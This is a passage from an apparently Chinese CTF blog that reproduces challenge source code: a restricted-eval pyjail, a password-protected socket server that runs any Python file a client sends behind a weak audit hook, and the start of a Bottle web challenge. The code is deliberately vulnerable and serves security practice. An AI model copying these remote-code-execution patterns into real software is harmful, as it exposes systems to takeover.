class="keyword">return</span> <span class="string">&#x27;-1&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> n % <span class="number">4</span> == <span class="number">3</span>: <span class="comment"># as the 3 days in the tomb</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;-i&#x27;</span></span><br><span class="line"></span><br><span class="line">inp = <span class="built_in">input</span>(<span class="string">&quot;wash away your sins: &quot;</span>)</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">all</span>(i <span class="keyword">in</span> <span class="string">&quot;i0123456789+-*%/^=&lt;&gt;~&amp;|:()[]&#x27;&quot;</span> <span class="keyword">for</span> i <span class="keyword">in</span> inp), <span class="string">&quot;invalid char&quot;</span></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(inp) &lt; <span class="number">16</span>, <span class="string">&quot;too long&quot;</span></span><br><span class="line">R = <span class="built_in">eval</span>(<span class="string">f&quot;lambda i: <span class="subst">&#123;inp&#125;</span>&quot;</span>, &#123;&#125;, &#123;&#125;)</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">all</span>(R(i) == i_pow(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">int</span>.from_bytes(<span class="string">b&#x27;The_adwa_shall_forgive_thee&#x27;</span>) // <span class="number">2</span>**<span class="number">195</span>))</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h2 id="lament-jail"><a class="markdownIt-Anchor" href="#lament-jail"></a> Lament Jail*</h2><blockquote><p>异想体编号：H-██████ ；异想体名称：flag；安全等级：优；状态：该异想体已突破收容。描述：该异想体本质上为一段&quot;flag{“开头”}&quot;结尾的字符串。它极度胆怯，害怕人类不同等级的观察。该异想体经常突破收容。他的内容是██████████████████████████；收容条件：flag被收容在一个对公网开放的主机（flag-1，又名Lament Jail）上的/flag文件里。该主机上运行有能够让人们完全控制主机的服务（使用套接字进行远控），便于观测异想体状态；事件经过：事件编号████████████████。████年██月███日，由于工作人员██████████████的失误，flag被赋予高权限。它成功突破了收容。flag目前被观测到改写了人们控制它的服务。在这之上做了一些加密措施，并限制了远程代码的执行。这使得我们极难观测该异想体。同时，它摆脱了文件/flag的限制，逃到了█████████████。所幸，我们在主机上留下了/bin/rf，它可以直接从███████████████读取flag。同时，员工█████████████通过某种手段取回了正在运行的服务的源码。请你连接并突破该异想体在Lament Jail上做的限制，控制这台主机，找回flag。</p></blockquote><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># @FileName  :Lament_Jail.py</span></span><br><span class="line"><span class="comment"># @Time      :2025/3/22 12:37:43</span></span><br><span class="line"><span class="comment"># @Author    :LamentXU</span></span><br><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> remove</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES, PKCS1_OAEP</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">from</span> Crypto.Random <span class="keyword">import</span> get_random_bytes</span><br><span class="line"><span class="keyword">from</span> zlib <span class="keyword">import</span> compress, decompress</span><br><span class="line"><span class="keyword">from</span> uuid <span class="keyword">import</span> uuid4</span><br><span class="line"><span class="keyword">from</span> json <span class="keyword">import</span> dumps</span><br><span class="line"><span class="keyword">from</span> subprocess <span class="keyword">import</span> Popen, PIPE</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">Definate all the errors</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MessageLengthError</span>(<span class="title class_ inherited__">Exception</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, message</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        self.message = message</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">PasswordError</span>(<span class="title class_ inherited__">Exception</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, message</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        self.message = message</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SimpleTCP</span>():</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    The main class when using TCP</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, family: AddressFamily = AF_INET, <span class="built_in">type</span>: SocketKind = SOCK_STREAM</span></span><br><span class="line"><span class="params">                 , proto: <span class="built_in">int</span> = -<span class="number">1</span>, fileno: <span class="built_in">int</span> = <span class="literal">None</span>, is_encrypted: <span class="built_in">bool</span> = <span class="literal">True</span>, AES_key: <span class="built_in">bytes</span> = <span class="literal">None</span>, password: <span class="built_in">bytes</span> = <span class="literal">None</span></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        is_encrypted: use encrypted connection, only for server</span></span><br><span class="line"><span class="string">        AES_key: use a fixed AES_key, None for random, must be 16 bytes, only for server</span></span><br><span class="line"><span class="string">        password: A fixed password is acquired from the client (must smaller than be 100 bytes), if wrong, the connection will be closed</span></span><br><span class="line"><span class="string">            if password is set in server, every time a client connect, the client must send the same password back to the server to accept.</span></span><br><span class="line"><span class="string">            if password is set in client, every time you connect to the server, the password will be sent to the server to verify.</span></span><br><span class="line"><span class="string">            if password is None, no password will be used.</span></span><br><span class="line"><span class="string">        self.Default_message_len: if in encrypted mode, the value must be a multiple of self.BLOCK_SIZE</span></span><br><span class="line"><span class="string">        MAKE SURE THE DEFAULT_MESSAGE_LEN OF BOTH SERVER AND CLIENT ARE SAME, Or it could be a hassle</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        </span><br><span class="line">        self.BLOCK_SIZE = <span class="number">16</span> <span class="comment"># block size of padding text which will be encrypted by AES</span></span><br><span class="line">        <span class="comment"># the block size must be a mutiple of 8</span></span><br><span class="line">        self.default_encoder = <span class="string">&#x27;utf8&#x27;</span>  <span class="comment"># the default encoder used in send and recv when the message is not bytes</span></span><br><span class="line">        <span class="keyword">if</span> is_encrypted:</span><br><span class="line">            <span class="keyword">if</span> AES_key == <span class="literal">None</span>:</span><br><span class="line">                self.key = get_random_bytes(<span class="number">16</span>)  <span class="comment"># generate 16 bytes AES code</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                self.key = AES_key <span class="comment">#TODO check the input </span></span><br><span class="line">            self.cipher_aes = AES.new(self.key, AES.MODE_ECB)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.key, self.cipher_aes = <span class="literal">None</span>, <span class="literal">None</span></span><br><span class="line">        self.default_message_len = <span class="number">1024</span> <span class="comment"># length of some basic message, it&#x27;s best not to go below 1024 bytes</span></span><br><span class="line">        <span class="keyword">if</span> password == <span class="literal">None</span>:</span><br><span class="line">            self.password = <span class="literal">None</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.password = self.turn_to_bytes(password)</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(password) &gt; <span class="number">100</span>:</span><br><span class="line">                <span class="keyword">raise</span> ValueError(<span class="string">&#x27;The password is too long, it must be smaller than 100 bytes&#x27;</span>)</span><br><span class="line">        self.s = socket(family, <span class="built_in">type</span>, proto, fileno)  <span class="comment"># main socket</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">accept</span>(<span class="params">self</span>) -&gt; <span class="built_in">tuple</span>:</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        Accept with information exchange and key exchange, return the address of the client</span></span><br><span class="line"><span class="string">        if the password from client is wrong or not set, raise PasswordError</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        self.s, address = self.s.accept()</span><br><span class="line">        <span class="keyword">if</span> self.key == <span class="literal">None</span>:</span><br><span class="line">            is_encrypted = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            is_encrypted = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">if</span> self.password == <span class="literal">None</span>:</span><br><span class="line">            has_password = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            has_password = <span class="literal">True</span></span><br><span class="line">        info_dict = &#123;</span><br><span class="line">            <span class="string">&#x27;is_encrypted&#x27;</span> : is_encrypted,</span><br><span class="line">            <span class="string">&#x27;has_password&#x27;</span> : has_password&#125;</span><br><span class="line">        info_dict = dumps(info_dict).encode(encoding=self.default_encoder)</span><br><span class="line">        self.s.send(self.turn_to_bytes(<span class="built_in">len</span>(info_dict)))</span><br><span class="line">        self.s.send(info_dict)</span><br><span class="line">        <span class="keyword">if</span> has_password:</span><br><span class="line">            password_length = self.unpadding_packets(self.s.recv(<span class="number">3</span>), -<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> password_length:</span><br><span class="line">                self.s.close()</span><br><span class="line">                <span class="keyword">raise</span> PasswordError(<span class="string">f&#x27;The client <span class="subst">&#123;address&#125;</span> does not send the password, the connection will be closed&#x27;</span>)</span><br><span class="line">            recv_password = self.s.recv(<span class="built_in">int</span>(password_length.decode(encoding=self.default_encoder))) <span class="comment"># the first byte is whether the password is aquired(1) or not(0), the rest is the password, the password is padded to 100 bytes</span></span><br><span class="line">            <span class="keyword">if</span> recv_password != self.password <span class="keyword">or</span> recv_password[<span class="number">0</span>] == <span class="string">b&#x27;0&#x27;</span>:</span><br><span class="line">                self.s.send(<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">                self.s.close()</span><br><span class="line">                <span class="keyword">raise</span> PasswordError(<span class="string">f&#x27;The password <span class="subst">&#123;recv_password&#125;</span> is wrong, the connection from <span class="subst">&#123;address&#125;</span> will be closed, you can restart the accept() function or put it in a while loop to keep accepting&#x27;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                self.s.send(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> is_encrypted:</span><br><span class="line">            public_key = self.s.recv(<span class="number">450</span>)</span><br><span class="line">            rsa_public_key = RSA.import_key(public_key)</span><br><span class="line">            cipher_rsa = PKCS1_OAEP.new(rsa_public_key)</span><br><span class="line">            encrypted_aes_key = cipher_rsa.encrypt(self.key)</span><br><span class="line">            self.s.send(encrypted_aes_key)</span><br><span class="line">        <span class="comment"># TODO</span></span><br><span class="line">        <span class="keyword">return</span> address</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">turn_to_bytes</span>(<span class="params">self, message</span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        Turn str, int, etc. to bytes using &#123;self.default_encoder&#125;</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        type_of_message = <span class="built_in">type</span>(message)</span><br><span class="line">        <span class="keyword">if</span> type_of_message == <span class="built_in">str</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                message = message.encode(encoding=self.default_encoder)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">raise</span> TypeError(</span><br><span class="line">                    <span class="string">&#x27;Unexpected type &quot;&#123;&#125;&quot; of &#123;&#125; when encode it with &#123;&#125;, raw traceback: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(type_of_message, message, self.default_encoder, e))</span><br><span class="line">        <span class="keyword">elif</span> type_of_message == <span class="built_in">bytes</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                message = <span class="built_in">str</span>(message).encode(encoding=self.default_encoder)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">raise</span> TypeError(</span><br><span class="line">                    <span class="string">&#x27;Unexpected type &quot;&#123;&#125;&quot; of &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(type_of_message, message))</span><br><span class="line">        <span class="keyword">return</span> message</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">unpadding_packets</span>(<span class="params">self, data: <span class="built_in">bytes</span>, pad_num: <span class="built_in">int</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        Delete the blank bytes at the back of the message</span></span><br><span class="line"><span class="string">        pad_num : number of the blank bytes</span></span><br><span class="line"><span class="string">        pad_num = -1, delete all the blank bytes the the back(or use .rstrip() directly is ok)</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> pad_num == -<span class="number">1</span>:</span><br><span class="line">            data = data.rstrip()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">while</span> pad_num &gt; <span class="number">0</span> <span class="keyword">and</span> data[-<span class="number">1</span>:] == <span class="string">b&#x27; &#x27;</span>:</span><br><span class="line">                data = data[:-<span class="number">1</span>]</span><br><span class="line">                pad_num -= <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> data</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">padding_packets</span>(<span class="params">self, message: <span class="built_in">bytes</span>, target_length: <span class="built_in">int</span> = <span class="literal">None</span></span>) -&gt; <span class="built_in">tuple</span>:</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        Pad the packet to &#123;target_length&#125; bytes with b&#x27; &#x27;, used in not-encrypted mode</span></span><br><span class="line"><span class="string">        The packet must be smaller then &#123;target_length&#125;</span></span><br><span class="line"><span class="string">        target_length = None : use self.default_message_len</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        message = self.turn_to_bytes(message)</span><br><span class="line">        <span class="keyword">if</span> target_length == <span class="literal">None</span>:</span><br><span class="line">            target_length = self.default_message_len</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(message) &gt; target_length:</span><br><span class="line">            <span class="keyword">raise</span> MessageLengthError(</span><br><span class="line">                <span class="string">&#x27;the length &#123;&#125; bytes of the message is bigger than &#123;&#125; bytes, please use self.send_large_small and self.recv instead&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(<span class="built_in">len</span>(message)), target_length))</span><br><span class="line">        pad_num = target_length-<span class="built_in">len</span>(message)</span><br><span class="line">        message += <span class="string">b&#x27; &#x27;</span> * pad_num</span><br><span class="line">        <span class="keyword">return</span> (message, pad_num)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">pad_packets_to_mutiple</span>(<span class="params">self, data: <span class="built_in">bytes</span>, block_size: <span class="built_in">int</span> == <span class="literal">None</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        Pad the data to make the length of it become a mutiple of Blocksize, used in encrypted mode</span></span><br><span class="line"><span class="string">        target_length = None : use self.BLOCK_SIZE</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        padding_length = block_size - (<span class="built_in">len</span>(data) % block_size)</span><br><span class="line">        <span class="keyword">if</span> padding_length == <span class="number">0</span>:</span><br><span class="line">            padding_length = block_size</span><br><span class="line">        padding = <span class="built_in">bytes</span>([padding_length]) * padding_length</span><br><span class="line">        padded_data = data + padding</span><br><span class="line">        <span class="keyword">return</span> padded_data</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">send_large</span>(<span class="params">self, message</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        Send message with the socket</span></span><br><span class="line"><span class="string">        can accept bytes, str, int, etc.</span></span><br><span class="line"><span class="string">        every non-bytes message will be encoded with self.default_encoder</span></span><br><span class="line"><span class="string">        Every packet is forced to be filled to &#123;self.default_message_len&#125; bytes</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        message = self.turn_to_bytes(message)</span><br><span class="line">        message = compress(message)</span><br><span class="line">        message_list = [message[i:i + self.default_message_len]</span><br><span class="line">                        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(message), self.default_message_len)]</span><br><span class="line">        message_list_len = <span class="built_in">len</span>(message_list)</span><br><span class="line">        self._send(self.padding_packets(</span><br><span class="line">            self.turn_to_bytes(message_list_len))[<span class="number">0</span>])</span><br><span class="line">        message_index = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> message <span class="keyword">in</span> message_list:</span><br><span class="line">            message_padded = self.padding_packets(message)</span><br><span class="line">            message = message_padded[<span class="number">0</span>]</span><br><span class="line">            self._send(message)</span><br><span class="line">            message_index += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> message_index == message_list_len:</span><br><span class="line">                pad_num = message_padded[<span class="number">1</span>]</span><br><span class="line">                self._send(self.padding_packets(</span><br><span class="line">                    self.turn_to_bytes(<span class="built_in">str</span>(pad_num)))[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">send</span>(<span class="params">self, message</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        Send a message with the socket</span></span><br><span class="line"><span class="string">        can accept bytes, str, int, etc.</span></span><br><span class="line"><span class="string">        The data should not be larger than 9999 bytes</span></span><br><span class="line"><span class="string">        It can be used at any time </span></span><br><span class="line"><span class="string">        Use self.send_large and recv_large if you want to send a big message</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        message = self.turn_to_bytes(message)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            message_len = self.padding_packets(</span><br><span class="line">                self.turn_to_bytes(<span class="built_in">len</span>(message)), target_length=<span class="number">4</span>)[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">except</span> MessageLengthError:</span><br><span class="line">            <span class="keyword">raise</span> MessageLengthError(</span><br><span class="line">                <span class="string">&#x27;The length of message is longer than 9999 bytes(&#123;&#125; bytes), please use send_large instead&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(<span class="built_in">len</span>(message))))</span><br><span class="line">        self._send(message_len)</span><br><span class="line">        self._send(message)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_send</span>(<span class="params">self, message: <span class="built_in">bytes</span></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        The basic method to encrypt and send data </span></span><br><span class="line"><span class="string">        MUST BE A MUTIPLE OF THE BLOCK SIZE IN ENCRYPTED MODE</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> self.cipher_aes != <span class="literal">None</span>:</span><br><span class="line">            output_message = self.cipher_aes.encrypt(self.pad_packets_to_mutiple(message, self.BLOCK_SIZE))</span><br><span class="line">            <span class="comment"># plainmessage = unpad(self.cipher_aes.decrypt(output_message), self.BLOCK_SIZE)</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            output_message = message</span><br><span class="line">        self.s.send(output_message)  <span class="comment"># The TCP mode</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">recvfile</span>(<span class="params">self</span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        Only receive file sent using self.send_largefile</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        output = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            a = self.recv_large(is_decode=<span class="literal">False</span>)</span><br><span class="line">            <span class="keyword">if</span> a != <span class="string">&#x27;EOF&#x27;</span>.encode(encoding=self.default_encoder):</span><br><span class="line">                output += a</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">return</span> output</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">recv_large</span>(<span class="params">self, is_decode: <span class="built_in">bool</span> = <span class="literal">True</span></span>):</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        The return type can be bytes or string</span></span><br><span class="line"><span class="string">        The method to recv message WHICH IS SENT BY self.send_large</span></span><br><span class="line"><span class="string">        is_decode : decode the message with &#123;self.default_encoder&#125;</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        message_listlen = self._recv(self.default_message_len).decode(</span><br><span class="line">            encoding=self.default_encoder).rstrip()</span><br><span class="line">        message_listlen = <span class="built_in">int</span>(message_listlen)</span><br><span class="line">        message = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, message_listlen):</span><br><span class="line">            mes = self._recv(self.default_message_len)</span><br><span class="line">            <span class="keyword">if</span> i == message_listlen - <span class="number">1</span>:</span><br><span class="line">                mes_padnum = <span class="built_in">int</span>(self._recv(self.default_message_len).decode(</span><br><span class="line">                    encoding=self.default_encoder))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                mes_padnum = <span class="number">0</span></span><br><span class="line">            mes = self.unpadding_packets(mes, mes_padnum)</span><br><span class="line">            message += mes</span><br><span class="line">        message = decompress(message)</span><br><span class="line">        <span class="keyword">if</span> is_decode:</span><br><span class="line">            message = message.decode(encoding=self.default_encoder)</span><br><span class="line">        <span class="keyword">return</span> message</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_recv</span>(<span class="params">self, length: <span class="built_in">int</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        The basic method to decrypt and recv data</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> self.cipher_aes != <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">if</span> length % <span class="number">16</span> == <span class="number">0</span>:</span><br><span class="line">                length += <span class="number">16</span></span><br><span class="line">            length = (length + self.BLOCK_SIZE-<span class="number">1</span>) // self.BLOCK_SIZE * self.BLOCK_SIZE <span class="comment"># round up to multiple of 16</span></span><br><span class="line">            message = self.s.recv(length)</span><br><span class="line">            message = self.cipher_aes.decrypt(message)</span><br><span class="line">            message = self.unpad_packets_to_mutiple(message, self.BLOCK_SIZE)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            message = self.s.recv(length)</span><br><span class="line">        <span class="keyword">return</span> message</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">unpad_packets_to_mutiple</span>(<span class="params">self, padded_data: <span class="built_in">bytes</span>, block_size: <span class="built_in">int</span> == <span class="literal">None</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        Unpad the data to make the length of it become a mutiple of Blocksize, used in encrypted mode</span></span><br><span class="line"><span class="string">        target_length = None : use self.BLOCK_SIZE</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> block_size == <span class="literal">None</span>:</span><br><span class="line">            block_size = self.BLOCK_SIZE</span><br><span class="line">        padding = padded_data[-<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">if</span> padding &gt; block_size <span class="keyword">or</span> <span class="built_in">any</span>(byte != padding <span class="keyword">for</span> byte <span class="keyword">in</span> padded_data[-padding:]):</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&quot;Invalid padding&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> padded_data[:-padding]</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    Sock = SimpleTCP(password=<span class="string">&#x27;LetsLament&#x27;</span>)</span><br><span class="line">    Sock.s.bind((<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">13337</span>))</span><br><span class="line">    Sock.s.listen(<span class="number">5</span>) </span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        _ = Sock.accept()     </span><br><span class="line">        Sock.send(<span class="string">&#x27;Hello, THE flag speaking.&#x27;</span>)</span><br><span class="line">        Sock.send(<span class="string">&#x27;I will not let you to control Lament Jail forever.&#x27;</span>)</span><br><span class="line">        Sock.send(<span class="string">&#x27;But, my friend LamentXU has to control it, as he will rescue me out of this jail.&#x27;</span>)</span><br><span class="line">        Sock.send(<span class="string">&#x27;So here is the pyJail I build. Only LamentXU knows how to break it.&#x27;</span>)    </span><br><span class="line">        a = Sock.recvfile().decode()</span><br><span class="line">        waf = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">import sys</span></span><br><span class="line"><span class="string">def audit_checker(event,args):</span></span><br><span class="line"><span class="string">    if not &#x27;id&#x27; in event:</span></span><br><span class="line"><span class="string">    raise RuntimeError</span></span><br><span class="line"><span class="string">sys.addaudithook(audit_checker)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">        content = waf + a</span><br><span class="line">        name = uuid4().<span class="built_in">hex</span>+<span class="string">&#x27;.py&#x27;</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(name, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(content)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            cmd = [<span class="string">&quot;python3&quot;</span>, name]</span><br><span class="line">            p = Popen(cmd, stdout=PIPE, stderr=PIPE)</span><br><span class="line">            <span class="keyword">for</span> line <span class="keyword">in</span> <span class="built_in">iter</span>(p.stdout.readline, <span class="string">b&#x27;&#x27;</span>):</span><br><span class="line">                Sock.send(line.decode(<span class="string">&#x27;utf-8&#x27;</span>).strip())</span><br><span class="line">            p.wait()</span><br><span class="line">            Sock.send(<span class="string">&#x27;Done, BYE.&#x27;</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            Sock.send(<span class="string">&#x27;Error.&#x27;</span>)</span><br><span class="line">        <span class="keyword">finally</span>:</span><br><span class="line">            Sock.s.close()</span><br><span class="line">        remove(name)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            main()</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><h2 id="喜欢就说出来"><a class="markdownIt-Anchor" href="#喜欢就说出来"></a> 喜欢就说出来*</h2><blockquote><p>小Shark在上课时和自己的暗恋对象坐在了一起，小Shark想要把悄悄话和文件传给同桌，可惜小Shark没有移动硬盘，不过这难不住聪明的小Shark，小Shark在同桌的电脑上敲了几下键盘，用自己的浏览器给同桌试传了两张自己的照片和一句悄悄话，你能发现小Shark对同桌说了什么吗？会不会是…520?!呢?</p></blockquote><p>是流量包分析呢，先润</p><h1 id="web"><a class="markdownIt-Anchor" href="#web"></a> Web</h1><h2 id="signin"><a class="markdownIt-Anchor" href="#signin"></a> Signin</h2><blockquote><p>来点真正的签到吧！</p></blockquote><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">@File    :   main.py</span></span><br><span class="line"><span class="string">@Time    :   2025/03/28 22:20:49</span></span><br><span class="line"><span class="string">@Author  :   LamentXU </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">flag in /flag_&#123;uuid4&#125;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">from</span> bottle <span class="keyword">import</span> Bottle, request, response, redirect, static_file, run, route</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;../../secret.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    secret = f.read()</span><br><span class="line"></span><br><span class="line">app = Bottle()</span><br><span class="line"><span class="meta">@route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;&#x27;HI&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="meta">@route(<span class="params"><span class="string">&#x27;/download&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download</span>():</span><br><span class="line">    name = 